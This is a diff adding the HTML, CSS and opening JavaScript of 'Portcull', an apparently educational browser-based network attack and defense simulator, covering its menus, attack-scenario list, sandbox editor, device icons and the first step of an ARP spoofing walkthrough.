@@ -1,0 +1,1816 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Portcull</title>
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<meta name="theme-color" content="#161120">
+<meta name="description" content="A browser-based cyber attack & defense simulator: build a network, launch an attack and watch it flow, with a step-by-step breakdown.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --void:#161120; --night:#1E1830; --panel:#282036; --dusk:#3C3356; --stage:#221B36;
+    --violet:#9B6CFF; --violet-dim:#8B5CF6; --teal:#2DD4BF;
+    --cotton:#F6F5FC; --stone:#EBD1A8; --cocoa:#A08A85;
+    --scarlet:#E11D29; --currant:#8C0004; --marigold:#F0B445; --melon:#FFA577; --pumpkin:#D55448;
+    --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+    --sans:'Space Grotesk',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;min-height:100%}
+  body{
+    background:
+      radial-gradient(900px 520px at 12% -12%, rgba(155,108,255,.22), transparent 60%),
+      radial-gradient(820px 520px at 112% 6%, rgba(45,212,191,.14), transparent 55%),
+      radial-gradient(700px 600px at 50% 120%, rgba(225,29,41,.08), transparent 60%),
+      var(--void);
+    color:var(--cotton); font-family:var(--sans); font-size:15px; line-height:1.5; -webkit-font-smoothing:antialiased;
+  }
+  a{color:var(--teal)}
+  .screen{display:none}
+  .screen.active{display:block}
+  .logo{display:flex; align-items:center; gap:11px; font-weight:700}
+  .logo .mark{width:32px;height:32px;flex:none;display:block;
+    filter:drop-shadow(0 0 12px rgba(155,108,255,.55)); transition:transform .25s cubic-bezier(.2,.8,.2,1), filter .25s}
+  .logo:hover .mark{transform:rotate(-6deg) scale(1.06); filter:drop-shadow(0 0 16px rgba(45,212,191,.6))}
+  .logo b{font-size:21px; letter-spacing:.3px}
+  .logo .ver{color:var(--cocoa); font-size:11.5px; font-family:var(--mono)}
+
+  /* MENU */
+  #menu .wrap{max-width:1160px; margin:0 auto; padding:34px 28px; min-height:100vh;
+    display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center}
+  @media (max-width:860px){ #menu .wrap{grid-template-columns:1fr; gap:26px; padding:28px 20px} }
+  .menu-left{align-self:start}
+  .hero-title{font-size:44px; line-height:1.08; font-weight:700; margin:26px 0 10px; letter-spacing:-.5px}
+  .hero-title .accent{background:linear-gradient(90deg,var(--violet),var(--teal)); -webkit-background-clip:text; background-clip:text; color:transparent}
+  .hero-sub{font-size:16px; color:#cdc6dd; max-width:440px; margin-bottom:24px}
+  .nav{display:flex; flex-direction:column; gap:10px; max-width:460px}
+  .nav button{display:flex; align-items:center; gap:14px; text-align:left; width:100%;
+    background:linear-gradient(180deg,var(--night),#1b1529); border:1px solid var(--dusk);
+    border-radius:13px; padding:13px 15px; cursor:pointer; color:var(--cotton); font-family:var(--sans);
+    transition:transform .12s, border-color .15s, box-shadow .15s}
+  .nav button:hover{transform:translateX(3px); border-color:var(--violet); box-shadow:0 6px 24px rgba(155,108,255,.18)}
+  .nav .ico{width:40px;height:40px;border-radius:10px;display:grid;place-items:center;flex:none; background:#2a2240; border:1px solid var(--dusk); font-size:18px}
+  .nav .txt b{display:block; font-size:15.5px; font-weight:600}
+  .nav .txt span{font-size:12.5px; color:var(--cocoa)}
+  .nav button.soon{opacity:.72}
+  .nav button.soon .badge{margin-left:auto; font-size:10.5px; font-family:var(--mono); color:var(--marigold); border:1px solid var(--dusk); border-radius:6px; padding:2px 7px}
+  .menu-foot{margin-top:22px; font-size:12px; color:var(--cocoa); max-width:460px}
+  .menu-right{display:grid; place-items:center}
+  #hero{width:100%; max-width:500px; height:auto}
+
+  /* SIM */
+  #sim header,#gallery header{display:flex; align-items:center; gap:14px; padding:14px 20px; border-bottom:1px solid var(--dusk); background:rgba(30,24,48,.7); backdrop-filter:blur(8px)}
+  .back{background:var(--panel); border:1px solid var(--dusk); color:var(--cotton); border-radius:9px; padding:8px 13px; cursor:pointer; font-family:var(--sans); font-size:13.5px}
+  .back:hover{border-color:var(--violet)}
+  header .spacer{flex:1}
+  .scenario{display:flex; align-items:center; gap:8px; font-size:13px; color:var(--stone)}
+  select{background:var(--panel); color:var(--cotton); border:1px solid var(--dusk); border-radius:8px; padding:7px 10px; font-family:var(--sans); font-size:13px; max-width:240px}
+  main{display:grid; grid-template-columns:1fr 360px; gap:16px; padding:16px; max-width:1300px; margin:0 auto}
+  @media (max-width:900px){ main{grid-template-columns:1fr} }
+  .card{background:var(--night); border:1px solid var(--dusk); border-radius:14px}
+  .stage{position:relative; overflow:hidden; min-height:440px; border-radius:14px 14px 0 0; background:var(--stage)}
+  .dotgrid{position:absolute; inset:0; background-image:radial-gradient(rgba(255,255,255,.1) 1.3px,transparent 1.3px); background-size:24px 24px; pointer-events:none}
+  svg{display:block; width:100%; height:auto}
+  #canvas{touch-action:none; user-select:none; -webkit-user-select:none}
+  .side{display:flex; flex-direction:column; gap:16px}
+  .panel{padding:16px}
+  .panel h2{margin:0 0 4px; font-size:12px; letter-spacing:1.4px; text-transform:uppercase; color:var(--cocoa)}
+  .step-title{font-size:17px; font-weight:600; margin:8px 0 6px}
+  .narr{font-size:14px; color:#ded9ea}
+  .tag{display:inline-block; font-family:var(--mono); font-size:11px; padding:3px 8px; border-radius:6px; border:1px solid var(--dusk); color:var(--stone); margin-top:11px}
+  .tag.attack{border-color:var(--scarlet); color:var(--melon)}
+  .tag.safe{border-color:var(--teal); color:var(--teal)}
+  .osi{font-family:var(--mono); font-size:12px}
+  .layer{border:1px solid var(--dusk); border-radius:9px; padding:9px 11px; margin-top:8px; background:var(--panel)}
+  .layer .lh{display:flex; justify-content:space-between; color:var(--cocoa); font-size:10.5px; letter-spacing:.5px; margin-bottom:5px}
+  .layer .row{display:flex; justify-content:space-between; gap:10px}
+  .layer .k{color:var(--stone)} .layer .v{color:var(--cotton); text-align:right; word-break:break-all}
+  .layer .v.bad{color:var(--melon); font-weight:600}
+  .empty{color:var(--cocoa); font-size:13px; font-family:var(--sans); padding:8px 0}
+  .controls{display:flex; align-items:center; gap:10px; padding:12px 16px; border-top:1px solid var(--dusk); flex-wrap:wrap}
+  button.ctl{background:var(--panel); color:var(--cotton); border:1px solid var(--dusk); border-radius:9px; padding:9px 14px; font-family:var(--sans); font-size:14px; cursor:pointer; transition:border-color .15s, background .15s}
+  button.ctl:hover{border-color:var(--violet)}
+  button.primary{background:var(--violet); border-color:var(--violet); font-weight:600; color:#120d1f}
+  button.primary:hover{background:#ab84ff}
+  button:disabled{opacity:.4; cursor:not-allowed}
+  .progress{flex:1; min-width:120px; height:6px; background:var(--dusk); border-radius:4px; overflow:hidden}
+  .progress .bar{height:100%; width:0; background:linear-gradient(90deg,var(--violet),var(--teal)); transition:width .3s}
+  .stepno{font-family:var(--mono); font-size:12px; color:var(--cocoa); min-width:46px; text-align:right}
+  .toggle{display:flex; align-items:center; gap:9px; margin-left:auto; font-size:13px; color:var(--stone)}
+  .switch-ui{position:relative; width:46px; height:26px; border-radius:14px; background:var(--dusk); cursor:pointer; transition:background .2s}
+  .switch-ui.on{background:var(--teal)}
+  .switch-ui .knob{position:absolute; top:3px; left:3px; width:20px; height:20px; border-radius:50%; background:var(--cotton); transition:left .2s}
+  .switch-ui.on .knob{left:23px}
+  .state{padding:0 16px 16px}
+  .state h3{font-size:12px; color:var(--cocoa); letter-spacing:1px; text-transform:uppercase; margin:14px 0 6px}
+  table{width:100%; border-collapse:collapse; font-family:var(--mono); font-size:11.5px}
+  th,td{text-align:left; padding:5px 6px; border-bottom:1px solid var(--dusk)}
+  th{color:var(--cocoa); font-weight:500}
+  td.bad{color:var(--melon); font-weight:600}
+  .hint{font-size:11.5px; color:var(--cocoa); padding:10px 16px 0}
+  .legend{display:flex; gap:16px; flex-wrap:wrap; padding:10px 16px 14px; font-size:11.5px; color:var(--stone)}
+  .legend i{display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:5px; vertical-align:middle}
+  /* sandbox toolbar + palette (Tinkercad / Packet Tracer style) */
+  .sbbar{display:flex; align-items:center; gap:10px; padding:12px 16px; border-top:1px solid var(--dusk); flex-wrap:wrap; border-radius:0 0 14px 14px}
+  .sbbar .lab{font-size:12.5px; color:var(--cocoa); margin-right:2px}
+  .sbbar button{background:var(--panel); color:var(--cotton); border:1px solid var(--dusk); border-radius:8px; padding:7px 12px; font-family:var(--sans); font-size:13px; cursor:pointer; transition:border-color .15s, background .15s}
+  .sbbar button:hover{border-color:var(--violet)}
+  .sbbar button.on{background:var(--violet); border-color:var(--violet); color:#120d1f; font-weight:600}
+  .sbbar .sep{width:1px; height:24px; background:var(--dusk); margin:0 4px}
+  .palette{display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin-top:4px}
+  .pal-item{display:flex; flex-direction:column; align-items:center; gap:5px; padding:9px 4px 7px; border:1px solid var(--dusk); border-radius:11px; background:var(--panel); cursor:grab; text-align:center; transition:border-color .12s, transform .1s}
+  .pal-item:hover{border-color:var(--violet); transform:translateY(-2px)}
+  .pal-item:active{cursor:grabbing}
+  .pal-item svg{width:42px; height:42px; pointer-events:none}
+  .pal-item span{font-size:10.5px; color:var(--stone); line-height:1.15}
+  .field{margin-bottom:11px; font-size:12.5px; color:var(--cocoa)}
+  .field input{display:block; width:100%; margin-top:4px; background:var(--panel); border:1px solid var(--dusk); color:var(--cotton); border-radius:8px; padding:8px 10px; font-family:var(--mono); font-size:12.5px}
+  .drop-hi{outline:2px dashed var(--violet); outline-offset:-6px}
+  /* gallery */
+  .gal-wrap{max-width:1200px; margin:0 auto; padding:22px 24px 48px}
+  .gal-top{display:flex; gap:12px; align-items:center; margin-bottom:20px; flex-wrap:wrap}
+  .gal-search{flex:1; min-width:220px}
+  .gal-search input{width:100%; background:var(--night); border:1px solid var(--dusk); color:var(--cotton); border-radius:10px; padding:11px 14px 11px 38px; font-family:var(--sans); font-size:14px;
+    background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23A08A85" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>'); background-repeat:no-repeat; background-position:13px center}
+  .gal-filter{display:flex; align-items:center; gap:8px; font-size:13px; color:var(--stone)}
+  .gal-grid{display:grid; grid-template-columns:repeat(auto-fill,minmax(270px,1fr)); gap:16px}
+  .gal-card{background:var(--night); border:1px solid var(--dusk); border-radius:14px; overflow:hidden; cursor:pointer; transition:border-color .15s, transform .1s, box-shadow .15s}
+  .gal-card:hover{border-color:var(--violet); transform:translateY(-3px); box-shadow:0 10px 30px rgba(155,108,255,.16)}
+  .gal-card .prev{background:var(--stage); border-bottom:1px solid var(--dusk)}
+  .gal-card .prev svg{display:block}
+  .gal-card .body{padding:14px 15px 16px}
+  .gal-card .chip{font-family:var(--mono); font-size:10px; letter-spacing:.3px; color:var(--stone); border:1px solid var(--dusk); border-radius:6px; padding:2px 7px; display:inline-block; margin-bottom:9px}
+  .gal-card .chip.dos{color:var(--marigold); border-color:#5a4a2a}
+  .gal-card .chip.spoof{color:var(--melon); border-color:#5a3030}
+  .gal-card .chip.cred{color:var(--teal); border-color:#2a4a46}
+  .gal-card .chip.web{color:var(--violet); border-color:#443a66}
+  .gal-card .chip.social{color:#f0a0c0; border-color:#5a3048}
+  .gal-card .chip.malware{color:var(--pumpkin); border-color:#5a342f}
+  /* command terminal under the canvas */
+  .term{margin:2px 16px 18px; background:#110c1a; border:1px solid var(--dusk); border-radius:12px; overflow:hidden}
+  .term-head{display:flex; align-items:center; gap:9px; padding:9px 14px; border-bottom:1px solid var(--dusk); color:var(--cocoa); font-size:11px; letter-spacing:.5px; text-transform:uppercase; font-family:var(--mono)}
+  .term-head .dot{width:9px; height:9px; border-radius:50%; flex:none}
+  .term pre{margin:0; padding:13px 15px; overflow-x:auto; font-family:var(--mono); font-size:12.5px; line-height:1.75; white-space:pre-wrap; word-break:break-word}
+  .term pre span{display:block}
+  .term .pfx{display:inline; opacity:.55; margin-right:9px; width:12px}
+  .term .l-c{color:#7d7391}
+  .term .l-a{color:var(--melon)}
+  .term .l-d{color:var(--teal)}
+  .term .l-o{color:var(--stone)}
+  /* library code panel */
+  .pill-row{display:flex; gap:6px; margin:4px 0 8px; flex-wrap:wrap}
+  .pill-row button{background:var(--panel); color:var(--stone); border:1px solid var(--dusk); border-radius:999px; padding:5px 12px; font-family:var(--sans); font-size:12px; cursor:pointer}
+  .pill-row button.on{background:var(--violet); color:#120d1f; border-color:var(--violet); font-weight:600}
+  .pill-row.lv button.on{background:var(--teal); color:#07201d}
+  .codeview{margin:0 0 10px; background:#110c1a; border:1px solid var(--dusk); border-radius:10px; padding:11px 13px; font-family:var(--mono); font-size:12px; line-height:1.6; white-space:pre-wrap; word-break:break-word; color:#d7d2e4; max-height:210px; overflow:auto}
+  .code-actions{display:flex; gap:8px; flex-wrap:wrap}
+  /* code editor modal */
+  .modal{position:fixed; inset:0; background:rgba(8,5,14,.74); display:flex; align-items:center; justify-content:center; z-index:60; padding:20px}
+  .modal-box{width:100%; max-width:920px; max-height:90vh; background:var(--night); border:1px solid var(--dusk); border-radius:16px; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 24px 70px rgba(0,0,0,.55)}
+  .modal-head{display:flex; align-items:center; justify-content:space-between; padding:13px 17px; border-bottom:1px solid var(--dusk)}
+  .modal-head b{font-size:15px}
+  .modal-head button{background:none; border:none; color:var(--cocoa); font-size:19px; cursor:pointer; line-height:1}
+  .modal-body{display:grid; grid-template-columns:1fr 250px; min-height:0; flex:1; overflow:hidden}
+  @media (max-width:720px){ .modal-body{grid-template-columns:1fr} .ed-help{display:none} }
+  .ed-left{display:flex; flex-direction:column; min-height:0; padding:14px; gap:10px}
+  #edCode{width:100%; height:190px; resize:vertical; background:#110c1a; border:1px solid var(--dusk); color:#eae6f5; border-radius:10px; padding:12px 14px; font-family:var(--mono); font-size:13px; line-height:1.6}
+  .ed-actions{display:flex; gap:8px; flex-wrap:wrap}
+  .ed-console{margin:0; background:#0c0813; border:1px solid var(--dusk); border-radius:10px; padding:11px 13px; font-family:var(--mono); font-size:12px; line-height:1.6; min-height:96px; max-height:220px; overflow:auto; white-space:pre-wrap; word-break:break-word}
+  .ed-help{border-left:1px solid var(--dusk); padding:14px 15px; overflow:auto; font-family:var(--mono); font-size:11.5px; color:var(--cocoa); line-height:1.7}
+  .ed-help h4{margin:0 0 8px; font-family:var(--sans); font-size:12px; letter-spacing:1px; text-transform:uppercase; color:var(--stone)}
+  .ed-help code{color:var(--melon)}
+  .gal-card h3{margin:0 0 6px; font-size:16px; font-weight:600}
+  .gal-card p{margin:0; font-size:13px; color:var(--cocoa); line-height:1.45}
+  .gal-empty{grid-column:1/-1; color:var(--cocoa); padding:40px; text-align:center}
+  #toast{position:fixed; left:50%; bottom:28px; transform:translateX(-50%) translateY(20px); background:var(--night); border:1px solid var(--violet); color:var(--cotton); padding:11px 18px; border-radius:11px; font-size:14px; opacity:0; pointer-events:none; transition:opacity .25s, transform .25s; z-index:50; box-shadow:0 8px 30px rgba(0,0,0,.4)}
+  #toast.show{opacity:1; transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<!-- MAIN MENU -->
+<section id="menu" class="screen active">
+  <div class="wrap">
+    <div class="menu-left">
+      <div class="logo"><img class="mark" src="/favicon.svg" alt="" width="32" height="32"><b>Portcull</b><span class="ver">cyber range</span></div>
+      <h1 class="hero-title">Build networks.<br>Launch <span class="accent">attacks</span>.<br>Watch them flow.</h1>
+      <p class="hero-sub">A browser-based cyber attack &amp; defense simulator. Drop in devices, run an attack step by step, and inspect every packet across the OSI layers — with an explanation at each step.</p>
+      <nav class="nav" id="nav"></nav>
+      <div class="menu-foot">Open source · runs in the browser, no install · attack code executes only inside the sandbox and never touches a real network.</div>
+    </div>
+    <div class="menu-right">
+      <svg id="hero" viewBox="0 0 500 500" role="img" aria-label="Network illustration: a shield in the center surrounded by devices linked by glowing connections with packets"></svg>
+    </div>
+  </div>
+</section>
+
+<!-- ATTACK LIBRARY GALLERY -->
+<section id="gallery" class="screen">
+  <header>
+    <button class="back" id="galBack">← Menu</button>
+    <div class="logo"><img class="mark" src="/favicon.svg" alt="" width="32" height="32"><b>Portcull</b><span class="ver">attack library</span></div>
+    <div class="spacer"></div>
+  </header>
+  <div class="gal-wrap">
+    <div class="gal-top">
+      <div class="gal-search"><input id="galSearch" type="text" placeholder="Search attacks by name…" autocomplete="off"></div>
+      <div class="gal-filter">Type:
+        <select id="galFilter">
+          <option value="all">All attacks</option>
+          <option value="spoof">Interception / spoofing</option>
+          <option value="dos">DoS / DDoS</option>
+          <option value="web">Web application</option>
+          <option value="social">Social / human</option>
+          <option value="malware">Malware</option>
+          <option value="cred">Credentials</option>
+        </select>
+      </div>
+    </div>
+    <div class="gal-grid" id="galGrid"></div>
+  </div>
+</section>
+
+<!-- SIMULATOR -->
+<section id="sim" class="screen">
+  <header>
+    <button class="back" id="toMenu">← Menu</button>
+    <div class="logo"><img class="mark" src="/favicon.svg" alt="" width="32" height="32"><b>Portcull</b></div>
+    <div class="spacer"></div>
+    <div class="scenario" id="libScenario">Scenario:
+      <select id="scenario">
+        <optgroup label="Interception / spoofing">
+          <option value="arp">ARP spoofing (MITM)</option>
+          <option value="dhcp">DHCP starvation + rogue</option>
+          <option value="mac">MAC flooding (CAM)</option>
+          <option value="dns">DNS spoofing</option>
+        </optgroup>
+        <optgroup label="DoS / DDoS">
+          <option value="syn">SYN flood (DoS)</option>
+          <option value="icmp">ICMP flood (ping)</option>
+          <option value="ddos">DDoS — botnet</option>
+          <option value="ampl">DNS amplification (DDoS)</option>
+          <option value="slow">Slowloris (low-and-slow)</option>
+        </optgroup>
+        <optgroup label="Web application">
+          <option value="sqli">SQL injection</option>
+          <option value="xss">Cross-site scripting (XSS)</option>
+        </optgroup>
+        <optgroup label="Social / human">
+          <option value="phishing">Phishing &amp; lateral movement</option>
+        </optgroup>
+        <optgroup label="Malware">
+          <option value="ransom">Ransomware</option>
+        </optgroup>
+        <optgroup label="Credentials">
+          <option value="brute">Password brute force</option>
+        </optgroup>
+      </select>
+    </div>
+    <div class="scenario" id="sbTitle" style="display:none">🧪 Sandbox — build your own network</div>
+  </header>
+  <main>
+    <section class="card">
+      <div class="stage" id="stage">
+        <div class="dotgrid"></div>
+        <svg id="canvas" viewBox="0 0 960 440" role="img" aria-label="Network canvas"></svg>
+      </div>
+      <div id="libControls">
+      <div class="controls">
+        <button class="ctl" id="prev">◀ Step back</button>
+        <button class="ctl primary" id="play">▶ Play</button>
+        <button class="ctl" id="next">Step forward ▶</button>
+        <div class="progress"><div class="bar" id="bar"></div></div>
+        <div class="stepno" id="stepno">0 / 0</div>
+        <div class="toggle"><span>Defense</span>
+          <div class="switch-ui" id="defense" role="switch" aria-checked="false"><div class="knob"></div></div>
+        </div>
+      </div>
+      <div class="legend">
+        <span><i style="background:var(--melon)"></i>normal packet</span>
+        <span><i style="background:var(--scarlet)"></i>attack / poisoned path</span>
+        <span><i style="background:var(--marigold)"></i>flood (request storm)</span>
+        <span><i style="background:var(--teal)"></i>blocked by defense</span>
+        <span><i style="background:var(--currant)"></i>compromised node</span>
+      </div>
+      <div class="term" id="termPanel"></div>
+      </div>
+      <div id="sbToolbar" class="sbbar" style="display:none">
+        <span class="lab">Tool:</span>
+        <button data-tool="move" class="on">✋ Select / Move</button>
+        <button data-tool="link">🔗 Wire</button>
+        <button data-tool="packet">▶ Packet</button>
+        <button data-tool="delete">🗑 Delete</button>
+        <button data-tool="code">💻 Code</button>
+        <div class="sep"></div>
+        <button id="sbSim" class="primary">▶ Simulate</button>
+        <button id="sbClear">Clear</button>
+      </div>
+    </section>
+    <aside class="side">
+      <div id="libSide">
+      <div class="card panel">
+        <h2>How it works</h2>
+        <div class="narr" id="howText" style="font-size:13.5px;color:#cfc9dd"></div>
+      </div>
+      <div class="card panel">
+        <h2>What's happening</h2>
+        <div class="step-title" id="stepTitle">—</div>
+        <div class="narr" id="narr"></div>
+        <div id="tag"></div>
+      </div>
+      <div class="card panel">
+        <h2>Packet inspector · OSI</h2>
+        <div class="osi" id="osi"><div class="empty">Click a packet on the canvas to break it down by layer.</div></div>
+      </div>
+      <div class="card">
+        <div class="state" id="stateTables"></div>
+        <div class="hint" id="stateHint"></div>
+      </div>
+      <div class="card panel" id="codeCard">
+        <h2>Attack &amp; defense code</h2>
+        <div class="pill-row"><button data-cm="attack" class="on">Attack</button><button data-cm="defend">Defense</button></div>
+        <div class="pill-row lv"><button data-lv="easy" class="on">Easy</button><button data-lv="medium">Medium</button><button data-lv="hard">Serious</button></div>
+        <pre id="codeView" class="codeview"></pre>
+        <div class="code-actions"><button class="ctl" id="codeCopy">Copy</button><button class="ctl primary" id="codeOpen">Open in Sandbox ▶</button></div>
+      </div>
+      </div>
+      <div id="sbSide" style="display:none">
+        <div class="card panel">
+          <h2>Components</h2>
+          <div class="narr" style="font-size:12.5px;color:var(--cocoa);margin-bottom:8px">Drag a component onto the canvas, or click it to drop one in.</div>
+          <div class="palette" id="palette"></div>
+        </div>
+        <div class="card panel">
+          <h2>Selected device</h2>
+          <div id="sbInspector"><div class="empty">Nothing selected.</div></div>
+        </div>
+        <div class="card panel">
+          <h2>How to build</h2>
+          <div class="narr" style="font-size:12.5px">Drag components in from above. <b>✋ Select / Move</b> — drag to reposition and select. <b>🔗 Wire</b> — click two devices to lay a cable. <b>▶ Packet</b> — click a source, then a destination. <b>🗑 Delete</b> — remove a device or a cable.</div>
+        </div>
+      </div>
+    </aside>
+  </main>
+</section>
+
+<div id="editor" class="modal" style="display:none">
+  <div class="modal-box">
+    <div class="modal-head"><b id="edTitle">Code</b><button id="edClose" title="Close">✕</button></div>
+    <div class="modal-body">
+      <div class="ed-left">
+        <textarea id="edCode" spellcheck="false" placeholder="# VoidScript runs only inside the simulation — it can't touch the page or a real network.&#10;# e.g.   arpspoof Victim as Gateway"></textarea>
+        <div class="ed-actions"><button class="ctl primary" id="edRunBtn">▶ Run</button><button class="ctl" id="edReset">Reset state</button><button class="ctl" id="edClearBtn">Clear console</button></div>
+        <pre class="ed-console" id="edConsole"></pre>
+      </div>
+      <div class="ed-help" id="edHelp"></div>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+const SVGNS="http://www.w3.org/2000/svg";
+const L=(name,rows)=>({name,rows});
+const P=(label,...layers)=>({label,layers});
+const bad=v=>({v,bad:true});
+const AM="02:AA..AA", VM="02:BB..BB", GM="02:CC..CC";
+
+// ---------- Device icons (Packet Tracer / Visio style) ----------
+function iconMarkup(kind){
+  switch(kind){
+    case "pc": return `
+      <rect x="-25" y="-30" width="50" height="35" rx="4" fill="#15202b" stroke="var(--teal)" stroke-width="2"/>
+      <rect x="-21" y="-26" width="42" height="27" rx="2" fill="#0d322f"/>
+      <rect x="-15" y="-21" width="22" height="3" rx="1.5" fill="var(--teal)" opacity="0.85"/>
+      <rect x="-15" y="-15" width="29" height="3" rx="1.5" fill="var(--teal)" opacity="0.5"/>
+      <rect x="-15" y="-9" width="17" height="3" rx="1.5" fill="var(--teal)" opacity="0.5"/>
+      <rect x="-8" y="5" width="16" height="6" fill="#15202b" stroke="var(--teal)" stroke-width="1.5"/>
+      <rect x="-17" y="11" width="34" height="4" rx="2" fill="var(--teal)"/>`;
+    case "attacker": return `
+      <rect x="-23" y="-28" width="46" height="31" rx="3" fill="#230a0d" stroke="var(--scarlet)" stroke-width="2"/>
+      <rect x="-19" y="-24" width="38" height="23" rx="2" fill="#160608"/>
+      <text x="0" y="-6" text-anchor="middle" font-size="19" fill="var(--melon)">☠</text>
+      <path d="M-29 13 L29 13 L22 3 L-22 3 Z" fill="#2a0f12" stroke="var(--scarlet)" stroke-width="2" stroke-linejoin="round"/>`;
+    case "switch": return `
+      <rect x="-37" y="-17" width="74" height="31" rx="7" fill="#241d33" stroke="var(--violet)" stroke-width="2"/>
+      <rect x="-37" y="-17" width="74" height="12" rx="7" fill="#372b57"/>
+      <g stroke="var(--teal)" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M-24 1 H22 M-24 1 l6 -5 M-24 1 l6 5 M22 1 l-6 -5 M22 1 l-6 5"/>
+        <path d="M-24 9 H22 M-24 9 l6 -5 M-24 9 l6 5 M22 9 l-6 -5 M22 9 l-6 5"/>
+      </g>`;
+    case "router": return `
+      <ellipse cx="0" cy="12" rx="30" ry="9" fill="#1c1630" stroke="var(--violet)" stroke-width="2"/>
+      <path d="M-30 -8 V12 M30 -8 V12" stroke="var(--violet)" stroke-width="2" fill="none"/>
+      <rect x="-30" y="-8" width="60" height="20" fill="#241d33"/>
+      <ellipse cx="0" cy="-8" rx="30" ry="9" fill="#2e2545" stroke="var(--violet)" stroke-width="2"/>
+      <g stroke="var(--teal)" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M-17 -8 H17 M-17 -8 l5 -3.5 M-17 -8 l5 3.5 M17 -8 l-5 -3.5 M17 -8 l-5 3.5"/>
+        <path d="M0 -15 V-1 M0 -15 l-3.5 4 M0 -15 l3.5 4 M0 -1 l-3.5 -4 M0 -1 l3.5 -4"/>
+      </g>`;
+    case "server": return `
+      <rect x="-19" y="-31" width="38" height="60" rx="5" fill="#241d33" stroke="var(--stone)" stroke-width="2"/>
+      <rect x="-13" y="-24" width="26" height="9" rx="2" fill="#15111f"/>
+      <rect x="-13" y="-11" width="26" height="9" rx="2" fill="#15111f"/>
+      <rect x="-13" y="2" width="26" height="9" rx="2" fill="#15111f"/>
+      <rect x="-13" y="15" width="26" height="9" rx="2" fill="#15111f"/>
+      <circle cx="-8" cy="-19.5" r="1.7" fill="var(--teal)"/>
+      <circle cx="-8" cy="-6.5" r="1.7" fill="var(--marigold)"/>
+      <circle cx="-8" cy="6.5" r="1.7" fill="var(--teal)"/>
+      <circle cx="-8" cy="19.5" r="1.7" fill="var(--teal)"/>`;
+    case "cloud": return `
+      <path d="M-22 11 Q-35 11 -35 -2 Q-35 -15 -21 -14 Q-16 -27 0 -25 Q17 -27 21 -13 Q35 -14 35 0 Q35 11 22 11 Z" fill="#241d33" stroke="var(--cocoa)" stroke-width="2"/>
+      <text x="0" y="3" text-anchor="middle" font-size="10" fill="var(--cocoa)" font-family="JetBrains Mono, monospace">WWW</text>`;
+    case "firewall": return `
+      <rect x="-26" y="-20" width="52" height="38" rx="5" fill="#241d33" stroke="var(--marigold)" stroke-width="2"/>
+      <g stroke="var(--marigold)" stroke-width="1.2">
+        <line x1="-26" y1="-7" x2="26" y2="-7"/><line x1="-26" y1="5" x2="26" y2="5"/>
+        <line x1="-9" y1="-20" x2="-9" y2="-7"/><line x1="9" y1="-20" x2="9" y2="-7"/>
+        <line x1="-18" y1="-7" x2="-18" y2="5"/><line x1="0" y1="-7" x2="0" y2="5"/><line x1="18" y1="-7" x2="18" y2="5"/>
+        <line x1="-9" y1="5" x2="-9" y2="18"/><line x1="9" y1="5" x2="9" y2="18"/>
+      </g>
+      <path d="M0 -17 q5 6 0 10 q-5 -4 0 -10 Z" fill="var(--scarlet)"/>`;
+    case "ap": return `
+      <rect x="-22" y="5" width="44" height="15" rx="4" fill="#241d33" stroke="var(--teal)" stroke-width="2"/>
+      <circle cx="0" cy="12.5" r="2" fill="var(--teal)"/>
+      <g fill="none" stroke="var(--teal)" stroke-width="2" stroke-linecap="round">
+        <path d="M-15 0 A 15 15 0 0 1 15 0"/>
+        <path d="M-9 -6 A 9 9 0 0 1 9 -6"/>
+      </g>
+      <circle cx="0" cy="0" r="2.3" fill="var(--teal)"/>`;
+    case "person": return `
+      <circle cx="0" cy="-15" r="10" fill="#241d33" stroke="var(--stone)" stroke-width="2"/>
+      <path d="M-19 20 Q-19 -3 0 -3 Q19 -3 19 20 Z" fill="#241d33" stroke="var(--stone)" stroke-width="2"/>
+      <circle cx="0" cy="-15" r="4.5" fill="var(--stone)" opacity="0.45"/>`;
+  }
+  return "";
+}
+
+function N(x,y,label,sub,kind,ly){ return {x,y,label,sub,kind,ly:ly||-38}; }
+
+// ---------- Scenarios ----------
+const SCENARIOS = {
+
+ arp:{ name:"ARP spoofing",
+  nodes:{ victim:N(150,110,"Victim","10.0.0.10","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(430,220,"Switch","L2","switch",-30), gateway:N(690,220,"Gateway","10.0.0.1","router",-32), internet:N(882,220,"Internet","8.8.8.8","cloud",-34) },
+  links:[["victim","switch"],["attacker","switch"],["switch","gateway"],["gateway","internet"]],
+  attack:[
+   {title:"Normal traffic",narr:"The victim browses the internet. Its ARP table maps gateway 10.0.0.1 to the real MAC. The packet flows victim → switch → gateway → internet.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","gateway","internet"],kind:"normal",
+    pkt:P("HTTPS to 8.8.8.8",L("L2 · Ethernet",[["src",VM],["dst",GM],["type","0x0800 IPv4"]]),L("L3 · IPv4",[["src","10.0.0.10"],["dst","8.8.8.8"]]),L("L4 · TCP",[["dst port","443"],["flags","SYN"]])),
